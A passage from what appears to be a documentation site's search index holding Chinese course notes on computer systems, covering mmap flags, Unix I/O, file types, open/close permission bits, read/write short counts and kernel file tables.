\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u7ec4\u6210\u200b</li> <li>PROT_READ: \u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u5185\u200b\u7684\u200b\u9875\u9762\u200b\u53ef\u200b\u8bfb\u200b</li> <li>PROT_WRITE: \u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u5185\u200b\u7684\u200b\u9875\u9762\u200b\u53ef\u200b\u5199\u200b</li> <li>PROT_NONE: \u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u5185\u200b\u7684\u200b\u9875\u9762\u200b\u4e0d\u80fd\u200b\u88ab\u200b\u8bbf\u95ee\u200b</li> </ul> <p>\u200b\u53c2\u6570\u200b flags \u200b\u7531\u200b\u63cf\u8ff0\u200b\u88ab\u200b\u6620\u5c04\u200b\u5bf9\u8c61\u200b\u7c7b\u578b\u200b\u7684\u200b\u4f4d\u200b\u7ec4\u6210\u200b. \u200b\u5982\u679c\u200b\u8bbe\u7f6e\u200b\u4e86\u200b MAP_ANON \u200b\u6807\u8bb0\u200b\u4f4d\u200b, \u200b\u90a3\u4e48\u200b\u88ab\u200b\u6620\u5c04\u200b\u7684\u200b\u5bf9\u8c61\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u533f\u540d\u200b\u5bf9\u8c61\u200b. MAP_PRIVATE \u200b\u8868\u793a\u200b\u79c1\u6709\u200b\u5bf9\u8c61\u200b, MAP_SHARED \u200b\u8868\u793a\u200b\u5171\u4eab\u200b\u5bf9\u8c61\u200b.</p> <p>munmap \u200b\u51fd\u6570\u200b\u5220\u9664\u200b\u865a\u62df\u5185\u5b58\u200b\u7684\u200b\u533a\u57df\u200b </p>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/","title":"Chapter 10 System IO","text":""},{"location":"notes/ICS/Chapter%2010%20System%20IO/#101-unix-io","title":"10.1 Unix I/O","text":"<p>\u200b\u4e00\u4e2a\u200b Linux \u200b\u6587\u4ef6\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b m \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5e8f\u5217\u200b:</p> \\[ B_0,B_1,\\cdots,B_k,\\cdots,B_{m-1} \\] <p>\u200b\u5728\u200b Linux \u200b\u7cfb\u7edf\u200b\u4e2d\u200b, \u200b\u6709\u7740\u200b \"Everything is a file\" \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u54f2\u5b66\u200b, \u200b\u6240\u6709\u200b\u7684\u200b I/O \u200b\u8bbe\u5907\u200b\u90fd\u200b\u88ab\u200b\u6a21\u578b\u200b\u5316\u4f4d\u200b\u6587\u4ef6\u200b, \u200b\u6240\u6709\u200b\u7684\u200b\u8f93\u5165\u200b\u548c\u200b\u8f93\u51fa\u200b\u90fd\u200b\u5f53\u4f5c\u200b\u5bf9\u200b\u76f8\u5e94\u200b\u6587\u4ef6\u200b\u7684\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u6765\u200b\u8fdb\u884c\u200b.</p> <p>\u200b\u8fd9\u79cd\u200b\u5c06\u200b\u8bbe\u5907\u200b\u4f18\u96c5\u200b\u5730\u200b\u6620\u5c04\u200b\u6210\u200b\u6587\u4ef6\u200b\u7684\u200b\u65b9\u5f0f\u200b, \u200b\u5141\u8bb8\u200b Linux \u200b\u5185\u6838\u200b\u5f15\u51fa\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b, \u200b\u4f4e\u7ea7\u200b\u7684\u200b\u5e94\u7528\u200b\u63a5\u53e3\u200b, \u200b\u79f0\u4e3a\u200b Unix I/O. \u200b\u8fd9\u200b\u4f7f\u5f97\u200b\u6240\u6709\u200b\u7684\u200b\u8f93\u5165\u8f93\u51fa\u200b\u90fd\u200b\u80fd\u200b\u4ee5\u200b\u4e00\u79cd\u200b\u7edf\u4e00\u200b\u4e14\u200b\u4e00\u81f4\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6765\u200b\u6267\u884c\u200b:</p> <ul> <li>\u200b\u6253\u5f00\u200b\u6587\u4ef6\u200b. \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u901a\u8fc7\u200b\u8981\u6c42\u200b\u5185\u6838\u200b\u6253\u5f00\u200b\u76f8\u5e94\u200b\u7684\u200b\u6587\u4ef6\u200b, \u200b\u5ba3\u544a\u200b\u5b83\u200b\u60f3\u200b\u8bbf\u95ee\u200b\u4e00\u4e2a\u200b I/O \u200b\u8bbe\u5907\u200b. \u200b\u5185\u6838\u200b\u8fd4\u56de\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u7684\u200b\u975e\u8d1f\u200b\u6574\u6570\u200b, \u200b\u53eb\u505a\u200b \u200b\u63cf\u8ff0\u7b26\u200b, \u200b\u4ed6\u200b\u5728\u200b\u540e\u7eed\u200b\u5bf9\u6b64\u200b\u6587\u4ef6\u200b\u7684\u200b\u6240\u6709\u200b\u64cd\u4f5c\u200b\u4e2d\u200b\u6807\u8bc6\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b. \u200b\u5185\u6838\u200b\u8bb0\u5f55\u200b\u6709\u5173\u200b\u8fd9\u4e2a\u200b\u6253\u5f00\u200b\u6587\u4ef6\u200b\u7684\u200b\u4fe1\u606f\u200b, \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u53ea\u200b\u9700\u8981\u200b\u8bb0\u4f4f\u200b\u63cf\u8ff0\u7b26\u200b.</li> <li>Linux shell \u200b\u521b\u5efa\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u5f00\u59cb\u200b\u65f6\u200b\u90fd\u200b\u6709\u200b\u4e09\u4e2a\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b:</li> <li>\u200b\u6807\u51c6\u200b\u8f93\u5165\u200b(\u200b\u63cf\u8ff0\u7b26\u200b\u4e3a\u200b 0)</li> <li>\u200b\u6807\u51c6\u200b\u8f93\u51fa\u200b (\u200b\u63cf\u8ff0\u7b26\u200b\u4e3a\u200b 1)</li> <li>\u200b\u6807\u51c6\u200b\u9519\u8bef\u200b (\u200b\u63cf\u8ff0\u7b26\u200b\u4e3a\u200b 2)</li> <li>\u200b\u5934\u6587\u4ef6\u200b  \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u5e38\u91cf\u200b STDIN_FILENO, STDOUT_FILENO, STDERR_FILIENO \u200b\u53ef\u7528\u200b\u6765\u200b\u4ee3\u66ff\u200b\u663e\u5f0f\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u503c\u200b. <li>\u200b\u6539\u53d8\u200b\u5f53\u524d\u200b\u6587\u4ef6\u200b\u4f4d\u7f6e\u200b. \u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200b\u6587\u4ef6\u200b, \u200b\u5185\u6838\u200b\u4fdd\u5b58\u200b\u7740\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u4f4d\u7f6e\u200b \\(k\\) , \u200b\u521d\u59cb\u200b\u4e3a\u200b 0. \u200b\u8fd9\u4e2a\u200b\u4f4d\u7f6e\u200b\u5c31\u662f\u200b\u76f8\u5bf9\u200b\u4e8e\u200b\u6587\u4ef6\u200b\u5f00\u5934\u200b\u7684\u200b\u5b57\u8282\u200b\u504f\u79fb\u91cf\u200b. \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u6267\u884c\u200b seek \u200b\u64cd\u4f5c\u200b\u663e\u5f0f\u200b\u5730\u200b\u8bbe\u7f6e\u200b\u6587\u4ef6\u200b\u4f4d\u7f6e\u200b.</li> <li>\u200b\u8bfb\u5199\u200b\u6587\u4ef6\u200b. \u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u5c31\u662f\u200b\u4ece\u6587\u4ef6\u200b\u590d\u5236\u200b \\(n&gt;0\\) \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5230\u200b\u5185\u5b58\u200b, \u200b\u4ece\u6587\u4ef6\u200b\u4f4d\u7f6e\u200b \\(k\\) \u200b\u5f00\u59cb\u200b, \u200b\u5982\u4f55\u200b\u5c06\u200b \\(k\\) \u200b\u589e\u52a0\u200b\u5230\u200b \\(k+n\\). \u200b\u5982\u679c\u200b\u8bfb\u200b\u7684\u200b\u5185\u5bb9\u200b\u8d85\u8fc7\u200b\u6587\u4ef6\u5927\u5c0f\u200b, \u200b\u4f1a\u200b\u89e6\u53d1\u200b end-of-file(EOF) \u200b\u7684\u200b\u6761\u4ef6\u200b.</li> <li>\u200b\u5173\u95ed\u200b\u6587\u4ef6\u200b. \u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u5b8c\u6210\u200b\u5bf9\u200b\u6587\u4ef6\u200b\u7684\u200b\u8bbf\u95ee\u200b\u540e\u200b, \u200b\u53ef\u4ee5\u200b\u901a\u77e5\u200b\u5185\u6838\u200b\u5173\u95ed\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b. \u200b\u5185\u6838\u200b\u91ca\u653e\u200b\u6587\u4ef6\u200b\u6253\u5f00\u200b\u65f6\u200b\u521b\u5efa\u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b, \u200b\u5e76\u200b\u5c06\u200b\u63cf\u8ff0\u7b26\u200b\u6062\u590d\u200b\u5230\u200b\u53ef\u7528\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u6c60\u200b. \u200b\u8fdb\u7a0b\u200b\u7ec8\u6b62\u200b\u65f6\u200b, \u200b\u5185\u6838\u200b\u90fd\u200b\u4f1a\u200b\u5173\u95ed\u200b\u6240\u6709\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b\u5e76\u200b\u91ca\u653e\u200b\u5b83\u4eec\u200b\u7684\u200b\u5185\u5b58\u200b\u8d44\u6e90\u200b</li> <p>[!note] \u200b\u4f7f\u7528\u200b lseek \u200b\u8bbe\u7f6e\u200b\u6587\u4ef6\u200b\u4f4d\u7f6e\u200b</p> <p></p>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#102","title":"10.2 \u200b\u6587\u4ef6","text":"<ul> <li>\u200b\u666e\u901a\u200b\u6587\u4ef6\u200b (regular file), \u200b\u901a\u5e38\u200b\u8981\u200b\u533a\u5206\u200b\u6587\u672c\u6587\u4ef6\u200b\u548c\u200b\u4e8c\u8fdb\u5236\u200b\u6587\u4ef6\u200b. \u200b\u6587\u672c\u6587\u4ef6\u200b\u662f\u200b\u53ea\u200b\u542b\u200b ASCII \u200b\u6216\u200b Unicode \u200b\u5b57\u7b26\u200b\u7684\u200b\u666e\u901a\u200b\u6587\u4ef6\u200b.</li> <li>\u200b\u76ee\u5f55\u200b (directory)</li> <li>\u200b\u5957\u200b\u63a5\u5b57\u200b (socket) \u200b\u662f\u200b\u7528\u6765\u200b\u4e0e\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\u8de8\u200b\u7f51\u7edc\u901a\u4fe1\u200b\u7684\u200b\u6587\u4ef6\u200b</li> </ul> <p>Windows \u200b\u4e0e\u200b Linux \u200b\u7684\u200b\u6362\u884c\u200b\u5dee\u5f02\u200b</p> <p>\u200b\u5728\u200b Windows \u200b\u7cfb\u7edf\u200b\u4e2d\u200b, \u200b\u6bcf\u200b\u4e00\u884c\u200b\u7684\u200b\u7ed3\u675f\u7b26\u200b\u4e3a\u200b \\r\\n, \u200b\u8fd9\u662f\u200b\u9075\u5faa\u200b\u4e86\u200b\u6700\u65e9\u200b\u7684\u200b\u6253\u5b57\u673a\u200b\u7684\u200b\u4e60\u60ef\u200b, \u200b\u5148\u200b\u56de\u8f66\u200b(\u200b\u5149\u6807\u200b\u56de\u5230\u200b\u884c\u9996\u200b, \\r), \u200b\u518d\u200b\u6362\u884c\u200b(\u200b\u5149\u6807\u200b\u4e0b\u79fb\u200b\u4e00\u884c\u200b\\n). \u200b\u4e5f\u200b\u79f0\u4e3a\u200b CRLF.</p> <p>\u200b\u5728\u200b Linux \u200b\u7cfb\u7edf\u200b\u4e2d\u200b, \u200b\u4ec5\u200b\u4f7f\u7528\u200b\u6362\u884c\u7b26\u200b \\n (ASCII 0xa). \u200b\u4e5f\u200b\u79f0\u4e3a\u200b LF.</p> <p>\u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u7528\u200b Windows \u200b\u4fdd\u5b58\u200b\u6587\u672c\u200b, \u200b\u5728\u200b Linux \u200b\u7cfb\u7edf\u200b\u4e0b\u200b\u6253\u5f00\u200b, \u200b\u6bcf\u200b\u4e00\u884c\u200b\u7684\u200b\u672b\u5c3e\u200b\u90fd\u200b\u4f1a\u200b\u591a\u51fa\u200b\u4e00\u4e2a\u200b \\r, \u200b\u663e\u793a\u200b\u51fa\u6765\u200b\u662f\u200b ^M.</p> <p>\u200b\u81f3\u4e8e\u200b\u5728\u200b Linux \u200b\u4e0b\u200b\u4fdd\u5b58\u200b\u7684\u200b\u6587\u4ef6\u200b\u5728\u200b Windows \u200b\u7cfb\u7edf\u200b\u4e0b\u200b\u6253\u5f00\u200b, \u200b\u7531\u4e8e\u200b\u73b0\u5728\u200b\u7684\u200b\u7f16\u8f91\u5668\u200b\u548c\u200b IDE \u200b\u5df2\u7ecf\u200b\u975e\u5e38\u200b\u667a\u80fd\u200b, \u200b\u5b83\u4eec\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u8bc6\u522b\u200b Linux \u200b\u7684\u200b LF \u200b\u6362\u884c\u7b26\u200b, \u200b\u6240\u4ee5\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u95ee\u9898\u200b. \u200b\u5982\u679c\u200b\u662f\u200b\u6bd4\u8f83\u200b\u8001\u200b\u7684\u200b\u7f16\u8f91\u5668\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u751f\u200b\u6240\u6709\u200b\u6587\u672c\u200b\u6324\u200b\u5728\u200b\u4e00\u884c\u200b\u7684\u200b\u73b0\u8c61\u200b.</p>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#103","title":"10.3 \u200b\u6253\u5f00\u200b\u548c\u200b\u5173\u95ed\u200b\u6587\u4ef6","text":"<p>\u200b\u8fdb\u7a0b\u200b\u901a\u8fc7\u200b\u8c03\u7528\u200b open \u200b\u51fd\u6570\u200b\u6253\u5f00\u200b\u4e00\u4e2a\u200b\u5df2\u200b\u5b58\u5728\u200b\u7684\u200b\u6587\u4ef6\u200b\u6216\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u6587\u4ef6\u200b.</p> C<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n\nint open(char *filename, int flags, mode_t mode);\n// \u200b\u6210\u529f\u200b\u8fd4\u56de\u200b\u65b0\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b, \u200b\u51fa\u9519\u200b\u4e3a\u200b -1, \u200b\u5e76\u200b\u8bbe\u7f6e\u200b errno\n</code></pre> <p><code>flags</code> \u200b\u53c2\u6570\u200b:</p> <ul> <li>O_RDONLY: \u200b\u53ea\u8bfb\u200b</li> <li>O_WRONLY: \u200b\u53ea\u200b\u5199\u200b</li> <li>O_RDWR: \u200b\u53ef\u8bfb\u200b\u53ef\u200b\u5199\u200b</li> <li>O_CREAT: \u200b\u5982\u679c\u200b\u6587\u4ef6\u200b\u4e0d\u200b\u5b58\u5728\u200b, \u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u6587\u4ef6\u200b</li> <li>O_TRUNC: \u200b\u5982\u679c\u200b\u6587\u4ef6\u200b\u5df2\u7ecf\u200b\u5b58\u5728\u200b, \u200b\u7acb\u5373\u200b\u5c06\u200b\u6587\u4ef6\u200b\u7684\u200b\u957f\u5ea6\u200b\u4fee\u6539\u200b\u4e3a\u200b 0</li> <li>O_APPEND: \u200b\u6bcf\u6b21\u200b\u5199\u200b\u64cd\u4f5c\u200b\u8bbe\u7f6e\u200b\u6587\u4ef6\u200b\u4f4d\u7f6e\u200b\u5230\u200b\u6587\u4ef6\u200b\u7684\u200b\u7ed3\u5c3e\u5904\u200b.</li> </ul> <p><code>mode</code> \u200b\u53c2\u6570\u200b:</p> <p>\u200b\u6307\u5b9a\u200b\u4e86\u200b\u65b0\u200b\u6587\u4ef6\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\u4f4d\u200b.</p> <p>\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b</p> <p>\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\u5206\u4e3a\u200b\u53ef\u200b\u8bfb\u200b, \u200b\u53ef\u200b\u5199\u200b, \u200b\u53ef\u200b\u6267\u884c\u200b, \u200b\u5e76\u4e14\u200b\u9700\u8981\u200b\u533a\u5206\u200b\u7528\u6237\u200b(\u200b\u62e5\u6709\u8005\u200b), \u200b\u7528\u6237\u7ec4\u200b, \u200b\u5176\u4ed6\u4eba\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b. \u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u7528\u200b 3 \u200b\u4e2a\u200b 3 \u200b\u4f4d\u200b\u4e8c\u8fdb\u5236\u200b\u6570\u6765\u200b\u8868\u793a\u200b. \u200b\u5728\u200b Linux \u200b\u7cfb\u7edf\u200b\u4e2d\u200b, \u200b\u4f7f\u7528\u200b <code>ls -l</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u6e05\u695a\u200b\u5730\u200b\u770b\u5230\u200b\u6bcf\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\u4f4d\u200b. \u200b\u4f7f\u7528\u200b <code>chmod [number] [filename]</code> \u200b\u5c06\u200b number \u200b\u89c6\u4e3a\u200b\u4e00\u4e2a\u200b\u4e09\u4f4d\u200b\u516b\u8fdb\u5236\u200b\u6570\u5bf9\u200b\u6587\u4ef6\u200b\u7684\u200b\u6743\u9650\u200b\u4f4d\u200b\u8fdb\u884c\u200b\u4fee\u6539\u200b, \u200b\u4f8b\u5982\u200b <code>chmod 777</code> \u200b\u5c31\u662f\u200b\u4efb\u4f55\u4eba\u200b\u5bf9\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u90fd\u200b\u6709\u200b\u8bfb\u200b, \u200b\u5199\u200b, \u200b\u6267\u884c\u200b\u6743\u9650\u200b.</p> <p>\u200b\u4f5c\u4e3a\u200b\u4e0a\u4e0b\u6587\u200b\u7684\u200b\u4e00\u90e8\u5206\u200b, \u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u90fd\u200b\u6709\u200b\u4e00\u4e2a\u200b umask, \u200b\u901a\u8fc7\u200b\u8c03\u7528\u200b umask \u200b\u51fd\u6570\u200b\u8bbe\u7f6e\u200b. \u200b\u7528\u5e26\u200b mode \u200b\u53c2\u6570\u200b\u7684\u200b open \u200b\u51fd\u6570\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u6587\u4ef6\u200b\u65f6\u200b, \u200b\u6587\u4ef6\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\u4f4d\u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b mode &amp; ~umask.</p> <p>\u200b\u6587\u4ef6\u200b\u6743\u9650\u200b\u4f4d\u200b\u63a9\u7801\u200b:</p> <ul> <li>S_IRUSR</li> <li>S_IWUSR</li> <li>S_IXUSR</li> <li>S_IRGRP</li> <li>S_IWGRP</li> <li>S_IXGRP</li> <li>S_IROTH</li> <li>S_IWOTH</li> <li>S_IXOTH</li> </ul> <p>\u200b\u5bf9\u5e94\u200b\u4e09\u79cd\u200b\u8bbf\u95ee\u8005\u200b\u7684\u200b\u4e09\u79cd\u200b\u6743\u9650\u200b.</p> <p>\u200b\u6700\u540e\u200b, \u200b\u8fdb\u7a0b\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8c03\u7528\u200b close \u200b\u51fd\u6570\u200b\u5173\u95ed\u200b\u4e00\u4e2a\u200b\u5df2\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b.</p> C<pre><code>#include &lt;unistd.h&gt;\n\nint close(int fd);\n// \u200b\u82e5\u200b\u6210\u529f\u200b\u8fd4\u56de\u200b 0, \u200b\u5931\u8d25\u200b\u4e3a\u200b -1, \u200b\u5e76\u200b\u8bbe\u7f6e\u200b errno\n</code></pre>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#104","title":"10.4 \u200b\u8bfb\u5199\u200b\u6587\u4ef6","text":"<p>\u200b\u4f7f\u7528\u200b read \u200b\u548c\u200b write \u200b\u51fd\u6570\u200b\u6765\u200b\u6267\u884c\u200b\u8f93\u5165\u8f93\u51fa\u200b. </p> <p>\u200b\u5728\u200b\u67d0\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b, read \u200b\u548c\u200b write \u200b\u4f20\u9001\u200b\u7684\u200b\u5b57\u8282\u200b\u6bd4\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u8981\u6c42\u200b\u7684\u200b\u5c11\u200b, \u200b\u8fd9\u4e9b\u200b\u4e0d\u8db3\u200b\u503c\u200b\u4e0d\u200b\u8868\u793a\u200b\u6709\u200b\u9519\u8bef\u200b, \u200b\u51fa\u73b0\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u7684\u200b\u6709\u200b:</p> <ul> <li>\u200b\u9047\u5230\u200b EOF. \u200b\u7b2c\u4e00\u6b21\u200b\u8bfb\u200b\u5230\u200b EOF \u200b\u4f1a\u200b\u8fd4\u56de\u200b\u8bfb\u5230\u200b\u7684\u200b\u5b57\u8282\u6570\u200b, \u200b\u6b64\u540e\u200b\u7684\u200b read \u200b\u5c06\u200b\u8fd4\u56de\u200b 0.</li> <li>\u200b\u4ece\u200b\u7ec8\u7aef\u200b\u8bfb\u200b\u6587\u672c\u200b\u884c\u200b, \u200b\u4e00\u6b21\u200b\u4f20\u9001\u200b\u4e00\u4e2a\u200b\u6587\u672c\u200b\u884c\u200b, \u200b\u8fd4\u56de\u200b\u7684\u200b\u4e0d\u8db3\u200b\u503c\u200b\u7b49\u4e8e\u200b\u6587\u672c\u200b\u884c\u200b\u5927\u5c0f\u200b</li> <li>\u200b\u8bfb\u5199\u200b\u7f51\u7edc\u200b\u5957\u200b\u63a5\u5b57\u200b. \u200b\u7531\u4e8e\u200b\u5185\u90e8\u200b\u7f13\u51b2\u200b\u7ea6\u675f\u200b\u548c\u200b\u8f83\u200b\u957f\u200b\u7684\u200b\u7f51\u7edc\u200b\u5ef6\u8fdf\u200b\u4f1a\u200b\u5f15\u8d77\u200b read \u200b\u548c\u200b write \u200b\u8fd4\u56de\u200b\u4e0d\u8db3\u200b\u503c\u200b.</li> </ul>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#105","title":"10.5 \u200b\u6587\u4ef6\u200b\u5143\u200b\u6570\u636e","text":""},{"location":"notes/ICS/Chapter%2010%20System%20IO/#106","title":"10.6 \u200b\u5171\u4eab\u200b\u6587\u4ef6","text":"<p>\u200b\u5185\u6838\u200b\u4f7f\u7528\u200b\u4e09\u4e2a\u200b\u76f8\u5173\u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\u6765\u200b\u8868\u793a\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b</p> <ul> <li>\u200b\u63cf\u8ff0\u7b26\u200b\u8868\u200b (descriptor table). \u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u90fd\u200b\u6709\u200b\u72ec\u7acb\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u8868\u200b, \u200b\u5b83\u200b\u7684\u200b\u8868\u9879\u200b\u662f\u200b\u7531\u200b\u8fdb\u7a0b\u200b\u6253\u5f00\u200b\u7684\u200b\u6587\u4ef6\u200b\u63cf\u8ff0\u7b26\u200b\u6765\u200b\u7d22\u5f15\u200b\u7684\u200b, \u200b\u6bcf\u4e2a\u200b\u6253\u5f00\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u8868\u9879\u200b\u6307\u5411\u200b\u6587\u4ef6\u200b\u8868\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u8868\u9879\u200b.</li> <li>\u200b\u6587\u4ef6\u200b\u8868\u200b (file table). \u200b\u6253\u5f00\u200b\u6587\u4ef6\u200b\u7684\u200b\u96c6\u5408\u200b, \u200b\u6240\u6709\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b\u8fd9\u200b\u5f20\u8868\u200b. \u200b\u6bcf\u4e2a\u200b\u6587\u4ef6\u200b\u8868\u200b\u5305\u542b\u200b\u5f53\u524d\u200b\u7684\u200b\u6587\u4ef6\u200b\u4f4d\u7f6e\u200b, \u200b\u5f15\u7528\u200b\u8ba1\u6570\u200b (\u200b\u6709\u200b\u591a\u5c11\u200b\u4e2a\u200b\u63cf\u8ff0\u7b26\u200b\u8868\u9879\u200b\u6307\u5411\u200b\u5b83\u200b), \u200b\u4ee5\u53ca\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b v-node \u200b\u8868\u200b\u7684\u200b\u6307\u9488\u200b. \u200b\u5173\u95ed\u200b\u4e00\u4e2a\u200b\u63cf\u8ff0\u7b26\u200b\u4f1a\u200b\u51cf\u5c11\u200b\u76f8\u5e94\u200b\u7684\u200b\u6587\u4ef6\u200b\u8868\u8868\u200b\u9879\u4e2d\u200b\u7684\u200b\u5f15\u7528\u200b\u8ba1\u6570\u200b, \u200b\u53ea\u6709\u200b\u5f15\u7528\u200b\u8ba1\u6570\u200b\u4e3a\u200b 0 \u200b\u65f6\u200b\u5185\u6838\u200b\u624d\u200b\u4f1a\u200b\u5220\u9664\u200b\u8fd9\u4e2a\u200b\u8868\u9879\u200b</li> <li>v-node \u200b\u8868\u200b (vnode-table). \u200b\u6240\u6709\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b, \u200b\u6bcf\u4e2a\u200b\u8868\u9879\u200b\u5305\u542b\u200b\u4e86\u200b stat \u200b\u7ed3\u6784\u200b\u4e2d\u200b\u7684\u200b\u5927\u591a\u6570\u200b\u4fe1\u606f\u200b, \u200b\u5305\u62ec\u200b st_mode, st_size.</li> </ul> <p>\u200b\u7406\u89e3\u200b: v-node \u200b\u8868\u200b\u76f8\u5f53\u4e8e\u200b\u6587\u4ef6\u200b\u672c\u4f53\u200b\u7684\u200b\u4fe1\u606f\u200b, \u200b\u6587\u4ef6\u200b\u8868\u200b\u76f8\u5f53\u4e8e\u200b\u6587\u4ef6\u200b\u7684\u200b\u4e00\u4e2a\u200b copy, \u200b\u5b83\u200b\u53ef\u4ee5\u200b\u6307\u5411\u200b\u6587\u4ef6\u200b\u7684\u200b\u4e0d\u540c\u200b\u4f4d\u7f6e\u200b, \u200b\u63cf\u8ff0\u7b26\u200b\u8868\u9879\u200b\u76f8\u5f53\u4e8e\u200b\u4e00\u4e2a\u200b\u6307\u5411\u200b\u6587\u4ef6\u200b\u8868\u200b\u7684\u200b\u6307\u9488\u200b, \u200b\u5efa\u7acb\u200b\u4e86\u200b\u63cf\u8ff0\u7b26\u200b\u5230\u200b\u6587\u4ef6\u200b\u8868\u200b\u7684\u200b\u6620\u5c04\u200b. \u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u4e00\u4e2a\u200b\u63cf\u8ff0\u7b26\u200b\u770b\u4f5c\u200b\u6307\u5411\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b copy.</p> <p>\u200b\u4e0d\u540c\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u53ef\u80fd\u200b\u6307\u5411\u200b\u540c\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u672c\u4f53\u200b, \u200b\u4f46\u662f\u200b\u6307\u5411\u200b\u7684\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u6587\u4ef6\u200b\u4f4d\u7f6e\u200b, \u200b\u597d\u50cf\u200b\u6587\u4ef6\u200b\u7684\u200b\u4e0d\u540c\u200b\u5206\u8eab\u200b\u4e00\u6837\u200b. \u200b\u4f46\u662f\u200b\u8fd9\u4e9b\u200b\u5206\u8eab\u200b\u6307\u5411\u200b\u5171\u540c\u200b\u7684\u200b v-node \u200b\u8868\u200b, \u200b\u8fd9\u662f\u200b\u6587\u4ef6\u200b\u7684\u200b\u672c\u4f53\u200b\u4fe1\u606f\u200b.</p> <p>\u200b\u4e0d\u540c\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6307\u5411\u200b\u540c\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u5206\u8eab\u200b, \u200b\u4f8b\u5982\u200b\u901a\u8fc7\u200b fork \u200b\u64cd\u4f5c\u200b\u4ea7\u751f\u200b\u7684\u200b\u5b50\u200b\u8fdb\u7a0b\u200b, \u200b\u5177\u6709\u200b\u548c\u200b\u7236\u200b\u8fdb\u7a0b\u200b\u76f8\u540c\u200b\u7684\u200b\u63cf\u8ff0\u7b26\u200b\u8868\u200b, \u200b\u63cf\u8ff0\u7b26\u200b\u6307\u5411\u200b\u7684\u200b\u6587\u4ef6\u200b\u8868\u9879\u200b\u4e5f\u200b\u76f8\u540c\u200b. </p> <p> </p>"},{"location":"notes/ICS/Chapter%2010%20System%20IO/#107-io","title":"10.7 